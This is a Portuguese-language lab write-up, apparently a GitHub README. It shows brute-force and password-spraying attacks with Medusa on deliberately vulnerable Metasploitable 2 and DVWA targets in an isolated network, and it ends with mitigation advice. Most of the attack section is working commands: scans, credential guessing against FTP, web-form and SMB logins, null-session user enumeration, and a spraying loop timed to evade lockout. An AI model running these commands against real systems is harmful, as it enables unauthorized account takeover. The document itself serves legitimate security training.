# Laboratório de Ataques de Força Bruta com Medusa (Kali Linux)

> Projeto prático de cibersegurança: simulação de ataques de força bruta contra serviços FTP, aplicação web (DVWA) e SMB, utilizando **Kali Linux** e a ferramenta **Medusa**, em ambiente 100% controlado e isolado.

⚠️ **Aviso legal:** este laboratório foi executado **exclusivamente em ambiente virtual isolado (rede host-only)**, contra máquinas propositalmente vulneráveis (Metasploitable 2 e DVWA), criadas para fins educacionais. Realizar esse tipo de ataque contra sistemas de terceiros sem autorização é **crime** (no Brasil, enquadrado na Lei 12.737/2012 — "Lei Carolina Dieckmann" — e no Marco Civil da Internet). Tudo aqui tem finalidade exclusivamente didática.

---

## 📑 Sumário

1. [Objetivo do projeto](#-objetivo-do-projeto)
2. [O que é um ataque de força bruta](#-o-que-é-um-ataque-de-força-bruta)
3. [Ambiente de laboratório](#-ambiente-de-laboratório)
4. [Passo 1 — Configurando a rede isolada (host-only)](#-passo-1--configurando-a-rede-isolada-host-only)
5. [Passo 2 — Reconhecimento do alvo](#-passo-2--reconhecimento-do-alvo)
6. [Passo 3 — Wordlists utilizadas](#-passo-3--wordlists-utilizadas)
7. [Passo 4 — Ataque de força bruta em FTP](#-passo-4--ataque-de-força-bruta-em-ftp)
8. [Passo 5 — Ataque automatizado em formulário web (DVWA)](#-passo-5--ataque-automatizado-em-formulário-web-dvwa)
9. [Passo 6 — Password spraying em SMB com enumeração de usuários](#-passo-6--password-spraying-em-smb-com-enumeração-de-usuários)
10. [Validação dos acessos obtidos](#-validação-dos-acessos-obtidos)
11. [Recomendações de mitigação](#-recomendações-de-mitigação)
12. [Aprendizados e reflexões](#-aprendizados-e-reflexões)
13. [Referências](#-referências)

---

## 🎯 Objetivo do projeto

Este projeto tem como objetivo compreender, na prática, como funcionam ataques de força bruta (*brute force*) e de pulverização de senhas (*password spraying*) contra diferentes tipos de serviço, e entender — do lado defensivo — quais configurações tornam esses ataques inviáveis ou muito mais difíceis.

Foram simulados três cenários:

| Cenário | Serviço alvo | Técnica |
|---|---|---|
| 1 | FTP (Metasploitable 2) | Força bruta clássica usuário/senha |
| 2 | Formulário de login web (DVWA) | Automação de tentativas via formulário HTTP |
| 3 | SMB (Metasploitable 2) | Enumeração de usuários + *password spraying* |

---

## 📘 O que é um ataque de força bruta

Um ataque de força bruta consiste em testar, de forma automatizada, diversas combinações de usuário e senha contra um serviço de autenticação, até encontrar uma credencial válida. Existem variações importantes:

- **Força bruta clássica**: testa muitas senhas para um ou poucos usuários conhecidos.
- **Password spraying**: inverte a lógica — testa **uma ou poucas senhas comuns** contra **muitos usuários**, evitando bloqueios de conta por excesso de tentativas (muito usado contra políticas de bloqueio automático).
- **Credential stuffing**: usa pares usuário/senha vazados em outros incidentes, apostando no reaproveitamento de senhas pelas vítimas.

O **Medusa** é uma ferramenta de força bruta paralela, modular, que suporta dezenas de protocolos (FTP, SSH, SMB, HTTP, MySQL, RDP, entre outros), permitindo testar várias combinações de credenciais simultaneamente contra um ou mais alvos.

---

## 🧪 Ambiente de laboratório

| Componente | Função | IP (exemplo) |
|---|---|---|
| Kali Linux | Máquina atacante, onde o Medusa é executado | `192.168.56.10` |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB) | `192.168.56.20` |
| DVWA (Damn Vulnerable Web Application) | Alvo do ataque web, pode rodar na própria Metasploitable 2 ou em VM separada | `192.168.56.20` ou `192.168.56.30` |

**Requisitos:**
- VirtualBox instalado
- Imagem do Kali Linux (VM oficial ou ISO)
- Imagem do Metasploitable 2
- DVWA (já incluso em algumas builds de Metasploitable, ou instalado via XAMPP/Docker)

---

## 🌐 Passo 1 — Configurando a rede isolada (host-only)

O ponto mais importante do laboratório é **garantir que o ataque nunca saia da rede virtual**, isolando totalmente do host físico e da internet.

1. No VirtualBox, acesse **Arquivo → Preferências de Rede → Redes Somente-Host** (*Host-only Networks*) e crie uma rede (ex.: `vboxnet0`), com DHCP desabilitado ou configurado apenas para esse range interno.
2. Para **cada VM** (Kali e Metasploitable 2):
   - Acesse **Configurações → Rede**
   - Em **Adaptador 1**, selecione **Rede Somente-Host (Host-Only Adapter)** e escolha a rede criada (`vboxnet0`)
   - (Opcional) Deixe um segundo adaptador em NAT apenas no Kali, se precisar atualizar pacotes — **desative-o antes de atacar**.
3. Ligue as VMs e configure os IPs:

```bash
# Dentro do Kali, verificar interface e IP
ip a

# Caso precise configurar manualmente (ajuste a interface, ex: eth1)
sudo ip addr add 192.168.56.10/24 dev eth1
sudo ip link set eth1 up
```

4. Teste a conectividade entre as VMs:

```bash
ping -c 4 192.168.56.20
```

Se o `ping` responder, a rede isolada está funcionando corretamente.

---

## 🔍 Passo 2 — Reconhecimento do alvo

Antes de atacar qualquer serviço, é importante mapear o que está rodando no alvo. Usamos o **Nmap**:

```bash
nmap -sC -sV -p- 192.168.56.20
```

Saída esperada (resumida) deve mostrar portas como:

```
21/tcp   open  ftp     vsftpd 2.3.4
80/tcp   open  http    Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
```

Isso confirma a presença dos três serviços-alvo: **FTP**, **HTTP** (onde roda o DVWA) e **SMB**.

---

## 📝 Passo 3 — Wordlists utilizadas

Para fins didáticos, foram criadas wordlists **pequenas e propositalmente previsíveis**, simulando senhas fracas comuns em ambientes reais mal configurados. Os arquivos completos estão na pasta [`/wordlists`](./wordlists):

- `wordlists/usuarios.txt` — nomes de usuário testados
- `wordlists/senhas.txt` — senhas comuns testadas

Exemplo de conteúdo (`usuarios.txt`):

```
msfadmin
admin
root
user
service
```

Exemplo de conteúdo (`senhas.txt`):

```
123456
password
msfadmin
admin
toor
letmein
senha123
```

> 💡 Em um cenário real de auditoria, essas listas seriam muito maiores, geralmente derivadas de vazamentos conhecidos (ex.: `rockyou.txt`, já incluída no Kali em `/usr/share/wordlists/rockyou.txt.gz`).

---

## 🔐 Passo 4 — Ataque de força bruta em FTP

O Metasploitable 2 roda o **vsftpd 2.3.4**, uma versão propositalmente vulnerável, com usuário `msfadmin` e senha `msfadmin` por padrão — ideal para validar a técnica.

Comando utilizado:

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
```

**Explicação dos parâmetros:**

| Parâmetro | Significado |
|---|---|
| `-h` | Host alvo (IP único) |
| `-U` | Arquivo com lista de usuários |
| `-P` | Arquivo com lista de senhas |
| `-M` | Módulo/protocolo a ser testado (`ftp`, `ssh`, `smbnt`, `http`, etc.) |

Parâmetros adicionais úteis:

```bash
# Define número de threads paralelas (cuidado: pode gerar instabilidade/bloqueios)
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4

# Para na primeira combinação válida encontrada
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -f
```

**Resultado esperado:** o Medusa retorna uma linha `ACCOUNT FOUND` quando encontra a combinação válida, por exemplo:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

---

## 🌐 Passo 5 — Ataque automatizado em formulário web (DVWA)

Este é o cenário mais complexo, pois exige entender a requisição HTTP do formulário de login do DVWA (campos, cookies de sessão, token CSRF se habilitado, e mensagem de erro de login).

### 5.1 Configurar o nível de segurança do DVWA

No DVWA, acesse **DVWA Security** e configure o nível como **Low** (para focar no conceito de força bruta, sem o desafio adicional do token CSRF, que exigiria um script mais avançado).

### 5.2 Mapear a requisição do formulário

Com o navegador (ou Burp Suite), identifique os campos enviados no `POST` de login, por exemplo:

```
username=admin&password=senha123&Login=Login
```

E identifique uma string que apareça **somente quando o login falha**, por exemplo:

```
Login failed
```

### 5.3 Comando do Medusa com módulo `http`

```bash
medusa -h 192.168.56.20 \
  -U wordlists/usuarios.txt \
  -P wordlists/senhas.txt \
  -M http \
  -m DIR:/dvwa/login.php \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m FAIL:"Login failed"
```

**Explicação:**

- `-m DIR:` → caminho da página de login
- `-m FORM:` → corpo da requisição POST, com `^USER^` e `^PASS^` sendo substituídos automaticamente pelas combinações testadas
- `-m FAIL:` → string que identifica tentativa **malsucedida** (o Medusa considera sucesso quando essa string **não** aparece na resposta)

> ⚠️ Como o DVWA usa cookie de sessão (`PHPSESSID`) para manter o estado de login, em muitos casos é necessário capturar o cookie válido via `curl` ou Burp e informá-lo com o parâmetro `-m COOKIE:` ou usar um script próprio (ver `scripts/dvwa_brute_force.py` neste repositório) quando o Medusa sozinho não contornar a sessão.

### 5.4 Alternativa com script Python

Caso o módulo `http` do Medusa não lide bem com sessão/cookies do DVWA, um pequeno script Python com a biblioteca `requests` resolve o problema mantendo a sessão entre tentativas — disponível em [`scripts/dvwa_brute_force.py`](./scripts/dvwa_brute_force.py).

---

## 🗂️ Passo 6 — Password spraying em SMB com enumeração de usuários

### 6.1 Enumerar usuários válidos

Antes de "pulverizar" senhas, é preciso descobrir **quais usuários existem** no serviço SMB. Ferramentas usadas:

```bash
# Enumeração via enum4linux
enum4linux -U 192.168.56.20

# Alternativa com rpcclient (sessão nula)
rpcclient -U "" -N 192.168.56.20
rpcclient $> enumdomusers
```

Os usuários encontrados foram salvos em `wordlists/usuarios_smb.txt`.

### 6.2 Password spraying com Medusa

Diferente da força bruta clássica, aqui testamos **poucas senhas comuns** contra **todos os usuários enumerados**, evitando bloqueios de conta:

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios_smb.txt -p "123456" -M smbnt
```

Ou com uma pequena lista de senhas (uma por vez, com pausa entre execuções para simular comportamento de *spraying* real):

```bash
for senha in $(cat wordlists/senhas_spray.txt); do
  echo "[*] Testando senha: $senha"
  medusa -h 192.168.56.20 -U wordlists/usuarios_smb.txt -p "$senha" -M smbnt
  sleep 30
done
```

> 💡 O `sleep 30` simula o comportamento real de um atacante tentando **evitar detecção e bloqueio de conta**, espaçando as tentativas — diferente da força bruta "ruidosa" usada no FTP.

---

## ✅ Validação dos acessos obtidos

Após o Medusa reportar uma credencial válida, a validação manual confirma o acesso:

```bash
# FTP
ftp 192.168.56.20
# login com msfadmin / msfadmin

# SMB
smbclient -L //192.168.56.20 -U "usuario%senha"

# DVWA
# login manual via navegador com a credencial encontrada
```

Capturas de tela de cada validação estão na pasta [`/images`](./images).

---

## 🛡️ Recomendações de mitigação

| Vulnerabilidade observada | Recomendação |
|---|---|
| Senhas fracas/padrão (`msfadmin`, `admin`) | Política de senha forte (tamanho mínimo, complexidade, sem valores padrão de fábrica) |
| Sem bloqueio de conta após tentativas falhas | Implementar *account lockout* (ex.: bloquear após 5 tentativas) |
| Sem limitação de taxa (*rate limiting*) | Configurar `fail2ban` ou WAF para bloquear IPs com múltiplas falhas de login |
| Ausência de MFA | Habilitar autenticação multifator sempre que o serviço suportar |
| FTP em texto claro | Substituir por SFTP/FTPS, que criptografam a transmissão de credenciais |
| Enumeração de usuários via SMB (sessão nula) | Desabilitar sessões nulas (`restrict anonymous` no Samba/Windows) |
| Mensagens de erro de login muito específicas | Padronizar mensagens genéricas ("usuário ou senha inválidos") para dificultar enumeração |
| Falta de monitoramento | Centralizar logs de autenticação (SIEM) e alertar sobre padrões de força bruta/spraying |

---

## 💭 Aprendizados e reflexões

- Senhas padrão de fábrica continuam sendo uma das portas de entrada mais comuns em ambientes reais mal configurados.
- O Medusa é uma ferramenta simples de operar, mas poderosa quando combinada com reconhecimento prévio (Nmap) e enumeração de usuários (enum4linux/rpcclient).
- *Password spraying* é mais "silencioso" que a força bruta clássica, pois evita o gatilho de bloqueio de conta — por isso é tão usado em ataques reais contra ambientes corporativos (ex.: Office 365/Active Directory).
- A defesa mais eficaz não é uma única medida, mas a combinação de política de senha, MFA, bloqueio de conta e monitoramento ativo.

---

## 📚 Referências

- [Documentação oficial do Medusa (GitHub)](https://github.com/jmk-foofus/medusa)
- [Metasploitable 2 — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [Kali Linux Tools — Medusa](https://www.kali.org/tools/medusa/)

---

## 📂 Estrutura do repositório

```
.
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas.txt
│   ├── usuarios_smb.txt
│   └── senhas_spray.txt
├── scripts/
│   └── dvwa_brute_force.py
└── images/
    └── (capturas de tela organizadas por etapa)
```
